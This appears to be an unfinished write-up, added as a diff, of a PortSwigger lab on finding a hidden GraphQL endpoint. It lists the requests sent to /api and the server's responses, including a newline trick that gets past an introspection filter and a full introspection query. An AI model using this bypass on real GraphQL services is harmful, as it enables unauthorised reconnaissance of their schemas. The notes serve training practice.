@@ -1,0 +1,135 @@
+**Unfinished**
+
+The URL query parameter's value at the end of the file is meant to solve the following lab:
+https://portswigger.net/web-security/graphql/lab-graphql-find-the-endpoint
+
+https://<IP_Address>.web-security-academy.net/api
+"Query not present"
+
+https://<IP_Address>.web-security-academy.net/api?query
+
+{
+  "errors": [
+    {
+      "locations": [
+        {
+          "line": 1,
+          "column": 1
+        }
+      ],
+      "message": "Invalid syntax with offending token '<EOF>' at line 1 column 1"
+    }
+  ]
+}
+
+
+https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%7BqueryType%7Bname%7D%7D%7D
+
+{
+  "errors": [
+    {
+      "locations": [],
+      "message": "GraphQL introspection is not allowed, but the query contained __schema or __type"
+    }
+  ]
+}
+
+
+https://<IP_Address>.web-security-academy.net/api?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
+
+{
+  "data": {
+    "__schema": {
+      "queryType": {
+        "name": "query"
+      }
+    }
+  }
+}
+
+
+{
+    __schema {
+        queryType {
+            name
+        }
+        mutationType {
+            name
+        }
+        subscriptionType {
+            name
+        }
+        types {
+            ...FullType
+        }
+        directives {
+            name
+            description
+            args {
+                ...InputValue
+        }
+        onOperation  #Often needs to be deleted to run query
+        onFragment   #Often needs to be deleted to run query
+        onField      #Often needs to be deleted to run query
+        }
+    }
+}
+
+fragment FullType on __Type {
+    kind
+    name
+    description
+    fields(includeDeprecated: true) {
+        name
+        description
+        args {
+            ...InputValue
+        }
+        type {
+            ...TypeRef
+        }
+        isDeprecated
+        deprecationReason
+    }
+    inputFields {
+        ...InputValue
+    }
+    interfaces {
+        ...TypeRef
+    }
+    enumValues(includeDeprecated: true) {
+        name
+        description
+        isDeprecated
+        deprecationReason
+    }
+    possibleTypes {
+        ...TypeRef
+    }
+}
+
+fragment InputValue on __InputValue {
+    name
+    description
+    type {
+        ...TypeRef
+    }
+    defaultValue
+}
+
+fragment TypeRef on __Type {
+    kind
+    name
+    ofType {
+        kind
+        name
+        ofType {
+            kind
+            name
+            ofType {
+                kind
+                name
+            }
+        }
+    }
+}
